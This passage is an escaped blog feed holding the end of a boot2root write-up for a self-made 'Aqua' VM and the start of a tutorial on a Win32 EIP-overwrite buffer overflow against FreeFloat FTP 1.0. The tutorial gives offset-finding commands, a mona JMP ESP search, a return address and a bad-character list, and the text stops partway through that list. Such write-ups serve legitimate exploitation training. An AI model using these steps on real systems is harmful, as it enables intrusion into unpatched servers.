+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/ret.png&quot; alt=&quot;ret&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So if all is good, once &lt;strong&gt;ret&lt;/strong&gt; is executed, the opcodes inside the address that is pointed by &lt;strong&gt;EIP&lt;/strong&gt; will be executed, which is our &lt;strong&gt;NOPsleds&lt;/strong&gt;. So, we need to put the address where our &lt;strong&gt;NOPsleds&lt;/strong&gt; is located into our user controlled &lt;strong&gt;EIP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;So let’s put a breakpoint at the &lt;strong&gt;ret&lt;/strong&gt; instruction and look at the stack at the moment of the execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/37.png&quot; alt=&quot;37&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/37.2.png&quot; alt=&quot;37.2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Boom! We hit our first breakpoint!&lt;/p&gt;
+
+&lt;p&gt;Now, we can replace our Cs after the padding with the real shellcode. This is the &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-827.php&quot;&gt;shellcode&lt;/a&gt; that we will be using. You also can use another shellcode which may spawn a reverse shell or anything else.&lt;/p&gt;
+
+&lt;p&gt;Rerun the program with modified payload and put a breakpoint at the end of the &lt;code class=&quot;highlighter-rouge&quot;&gt;getname&lt;/code&gt; method.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/38.png&quot; alt=&quot;38&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we hit our breakpoint, run &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; to continue the execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/39.png&quot; alt=&quot;39&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So far so good, now run the binary outside gdb and put in our payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/40.png&quot; alt=&quot;40&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We managed to get a root shell in our debugging machine.&lt;/p&gt;
+
+&lt;p&gt;Now time for the tricky part. The &lt;strong&gt;ESP&lt;/strong&gt; of our debugging machine and the target machine is not exactly the same at the moment. This means we need to modify our &lt;strong&gt;EIP&lt;/strong&gt; address little by litte until it hits the right place. (It’s like playing jackpot, but better.)&lt;/p&gt;
+
+&lt;h3 id=&quot;debugging-machine-esp-address-0xbffffbe0--address-a&quot;&gt;Debugging machine ESP address: 0xbffffbe0 –&amp;gt; Address A&lt;/h3&gt;
+&lt;h3 id=&quot;debugging-machine-eip-address-0xbffff330--address-i&quot;&gt;Debugging machine EIP address: 0xbffff330 –&amp;gt; Address I&lt;/h3&gt;
+
+&lt;h3 id=&quot;aqua-machine-esp-address-0xbffffc30--address-b&quot;&gt;Aqua machine ESP address: 0xbffffc30 –&amp;gt; Address B&lt;/h3&gt;
+&lt;h3 id=&quot;aqua-machine-eip-address---address-ii&quot;&gt;Aqua machine EIP address: ? –&amp;gt; Address II&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/41.png&quot; alt=&quot;41&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the &lt;strong&gt;B &amp;gt; A&lt;/strong&gt; , means it is possible that &lt;strong&gt;II &amp;gt; I&lt;/strong&gt; .We will run our original payload first to see the outcome.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/42.png&quot; alt=&quot;42&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will slowly increment &lt;strong&gt;Address I&lt;/strong&gt; by &lt;strong&gt;10h&lt;/strong&gt; and wait for the magic to happen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/43.png&quot; alt=&quot;43&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And here we are. We got a shell! And a beautiful ascii art of &lt;strong&gt;Megumin&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/44.png&quot; alt=&quot;44&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thank you for playing with my machine and do tell &lt;a href=&quot;https://twitter.com/yunaranyancat&quot;&gt;me&lt;/a&gt; what should I improve on next time. Constructive criticisms are greatly appreciated. But pls don’t attack me too much. I’m scared. &lt;strong&gt;&amp;gt;w&amp;lt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/aqua/bang.gif&quot; alt=&quot;bang&quot; /&gt;&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Yo! This is my boot2root writeup for Aqua vm. For those who didn’t manage to play with it yet, download the vm and come back when you have finished or when you are stuck.</summary></entry><entry><title type="html">Binary Exploitation 0x01 : Vanilla EIP Overwrite Win32 Buffer Overflow</title><link href="http://localhost:4000/musubi/notes/vanillaeipoverwrite" rel="alternate" type="text/html" title="Binary Exploitation 0x01 : Vanilla EIP Overwrite Win32 Buffer Overflow" /><published>2020-01-01T00:00:00+08:00</published><updated>2020-01-01T00:00:00+08:00</updated><id>http://localhost:4000/musubi/notes/binary_exploitation_0x01</id><content type="html" xml:base="http://localhost:4000/musubi/notes/vanillaeipoverwrite">&lt;p&gt;It is time to play with the most simplest form of binary exploitation, &lt;strong&gt;vanilla EIP overwrite buffer overflow with no stack protection&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/muchhax.jpg&quot; alt=&quot;muchhax&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, let’s start with the basic : What is buffer overflow?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/buffer-overflow.png&quot; alt=&quot;bo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Normally, to trigger this vulnerability, a huge amount of input is inserted which leads the program to be unable to process the input properly.&lt;/p&gt;
+
+&lt;p&gt;For example , in this case, let’s say there is a program which accepts an input from the user, for example a program that simply asks a name from the user then prints it out back.&lt;/p&gt;
+
+&lt;p&gt;So the program flow would be like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Execute program -&amp;gt; ask input -&amp;gt; process input -&amp;gt; print out input&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s assume that the program can only handles a name which has around &lt;strong&gt;30&lt;/strong&gt; letters, which is, quite unusual for a normal people to have a name which is longer than that, or even that long.&lt;/p&gt;
+
+&lt;p&gt;However, if a user inserts a string which has a length longer than &lt;strong&gt;30&lt;/strong&gt;, this can lead the program to crash (as the input may have overwritten something somewhere inside the memory of the program).&lt;/p&gt;
+
+&lt;p&gt;Since the memory is overwritten by user controlled input, especially the &lt;strong&gt;EIP&lt;/strong&gt;, this can lead to remote code execution based on the input given by the user (which is the shellcode).&lt;/p&gt;
+
+&lt;p&gt;Now, it’s time to prove our theory…&lt;/p&gt;
+
+&lt;p&gt;In this demonstration, we will be using ;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Windows XP SP3 32 bits&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;FreeFloat FTP 1.0&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Immunity Debugger + Mona.py&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Kali Linux for developing the exploit&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, start the &lt;strong&gt;FTP Server&lt;/strong&gt; and attach it on &lt;strong&gt;Immunity Debugger&lt;/strong&gt;. In &lt;strong&gt;Immunity Debugger&lt;/strong&gt;, go to &lt;strong&gt;File&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Attach&lt;/strong&gt; then look for the name of the application. Once attached, the application will be paused automatically, to resume, click on the play button or &lt;strong&gt;F9&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/4.0.png&quot; alt=&quot;4.0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Please ensure that the target FTP server is reachable by the attacking machine (Kali) . Normally, user &lt;code class=&quot;highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; with password &lt;code class=&quot;highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; exists by default in the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By typing &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; , there is a lot of commands that can be tested for this vulnerability. So, let’s take &lt;code class=&quot;highlighter-rouge&quot;&gt;DIR&lt;/code&gt; command for example. Let’s craft our skeleton exploit code first.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, we are ready to have fun.;)&lt;/p&gt;
+
+&lt;p&gt;To perform this attack efficiently, we will follow these steps;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Fuzz the application (insert various length of payloads until the program crashes and overwrites the &lt;strong&gt;EIP&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Find the offset of the &lt;strong&gt;EIP&lt;/strong&gt; (we need to find the exact location of the &lt;strong&gt;EIP&lt;/strong&gt; before the overwrite, so we can get control of the &lt;strong&gt;EIP&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Replace the &lt;strong&gt;EIP&lt;/strong&gt; with something meaningful (something that can lead to our crafted shellcode, for example &lt;strong&gt;JMP ESP&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Find bad characters (bad characters, as the name implies, are hex values that can corrupt our exploit code. We will see an example later..)&lt;/li&gt;
+  &lt;li&gt;Craft shellcode (msfvenom bla bla bla…)&lt;/li&gt;
+  &lt;li&gt;Add few NOPsleds before the shellcode (I’ll tell you why later..)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;1--fuzzing-the-application&quot;&gt;1 . Fuzzing the application&lt;/h2&gt;
+
+&lt;p&gt;For now, we will only be using manual fuzzing, which means, we will put different length of strings of &lt;strong&gt;As&lt;/strong&gt; (\x41) in the payload until we managed to make it crash and overwrite something in the memory of the program, in this case, the &lt;strong&gt;EIP&lt;/strong&gt;. Upon experimenting with various amount of payload, we will find that one of the suitable amount of payload is &lt;strong&gt;1000&lt;/strong&gt; buffer of &lt;strong&gt;As&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Thus, our payload will look like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When we execute our exploit code, we will get this message in the debugger.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see in the debugger, our &lt;strong&gt;EIP&lt;/strong&gt; has been overwritten.&lt;/p&gt;
+
+&lt;h2 id=&quot;2-finding-the-eip-offset&quot;&gt;2. Finding the EIP offset&lt;/h2&gt;
+
+&lt;p&gt;Okay, we managed to overwrite our &lt;strong&gt;EIP&lt;/strong&gt; with our bunch of sent &lt;strong&gt;As&lt;/strong&gt;. Now what? We need to find the exact location (offset) of the &lt;strong&gt;EIP&lt;/strong&gt;, so that we can modify our &lt;strong&gt;As&lt;/strong&gt; into something more interesting. Normally, to find the offset, we need to craft a list of unique strings which has a length of &lt;strong&gt;1000&lt;/strong&gt; (in this case). Luckily, kali has a tool specifically for this kind of job.&lt;/p&gt;
+
+&lt;p&gt;Simply run in kali,&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msf-pattern_create -l 1000&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Replace the 1000 As in our payload with the crafted pattern.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Close the debugger, restart the application, reattach and resume the application. Run the exploit code with the crafted pattern as the payload. We will get something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, the &lt;strong&gt;EIP&lt;/strong&gt; is overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;69413269&lt;/code&gt; . Using &lt;code class=&quot;highlighter-rouge&quot;&gt;msf-pattern_offset&lt;/code&gt; in kali, we will know the position of the &lt;strong&gt;EIP&lt;/strong&gt; in our buffer.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msf-pattern_offset -l 1000 -q 69413269&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;EIP&lt;/strong&gt; is overwritten after &lt;strong&gt;247 As&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;To ensure if this is correct, we will modify a bit our payload into something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the &lt;strong&gt;EIP&lt;/strong&gt; is overwritten with &lt;strong&gt;4 Bs&lt;/strong&gt; (\x42), this means that the offset is correct.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yayy..&lt;/p&gt;
+
+&lt;h2 id=&quot;3-replace-the-eip-with-something-meaningful&quot;&gt;3. Replace the EIP with something meaningful&lt;/h2&gt;
+
+&lt;p&gt;Since we have conquered the &lt;strong&gt;EIP&lt;/strong&gt;, now it is time to find a good location for our payload. Looking at the debugger, our remaining buffer after &lt;strong&gt;EIP&lt;/strong&gt; are located at the address pointed by &lt;strong&gt;ESP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Right click at the &lt;strong&gt;ESP&lt;/strong&gt; and click &lt;strong&gt;Follow dump&lt;/strong&gt; to check the content of the address pointed by the &lt;strong&gt;ESP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the hex dump, it is shown that the address pointed by &lt;strong&gt;ESP&lt;/strong&gt; starts at the &lt;strong&gt;9th Cs&lt;/strong&gt; sent by our buffer. This means that, we need to add 8 bytes after &lt;strong&gt;EIP&lt;/strong&gt; before we can put our shellcode. Or else, the &lt;strong&gt;ESP&lt;/strong&gt; will not point to the start of our shellcode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some modification to our exploit code based on the explanation above.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Close the debugger, restart the application, reattach and resume the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay, since we know that our remaining buffer after the &lt;strong&gt;EIP&lt;/strong&gt; overwrite can be found in the &lt;strong&gt;ESP&lt;/strong&gt;, we can replace our &lt;strong&gt;EIP&lt;/strong&gt; with an address that contains &lt;strong&gt;JMP ESP&lt;/strong&gt; instruction in the program modules so that after the &lt;strong&gt;EIP&lt;/strong&gt; has been executed, our shellcode will be executed after that. Something like,&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;buffer ---&amp;gt; EIP [jmp esp] ---&amp;gt; ESP [shellcode]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This is where mona is useful. For mona, we will need ;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;List of modules the program is currently using&lt;/li&gt;
+  &lt;li&gt;List of addresses which contains &lt;strong&gt;JMP ESP&lt;/strong&gt; instruction&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To find all of the modules, type&lt;/p&gt;
+
+&lt;p&gt;!mona modules&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So, we will use &lt;strong&gt;SHELL32.dll&lt;/strong&gt; for this demonstration. To find list of &lt;strong&gt;JMP ESP instruction&lt;/strong&gt; addresses in the module, type&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!mona find -s &quot;\xff\xe4&quot; -m SHELL32.dll&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We will take the first address for now.. which is &lt;strong&gt;0x7cbd41fb&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Update our exploit code to look something like this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/binary0x01/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;4-finding-bad-characters&quot;&gt;4. Finding bad characters&lt;/h2&gt;
+
+&lt;p&gt;Bad characters are hex values that are not suitable for our shellcode. For example, &lt;strong&gt;\x00&lt;/strong&gt; is a bad character because it serves as a &lt;strong&gt;NULL&lt;/strong&gt; value or indicating the end of a string.&lt;/p&gt;
+
+&lt;p&gt;Note : Please be informed that our &lt;strong&gt;JMP ESP&lt;/strong&gt; address also must not contain bad characters. So, we may need to change our &lt;strong&gt;JMP ESP&lt;/strong&gt; address (0x7cbd41fb) later if it contains bad characters.&lt;/p&gt;
+
+&lt;p&gt;These are all possible hex values :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;13&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;26&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;39&quot;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&quot;&lt;/span&gt;
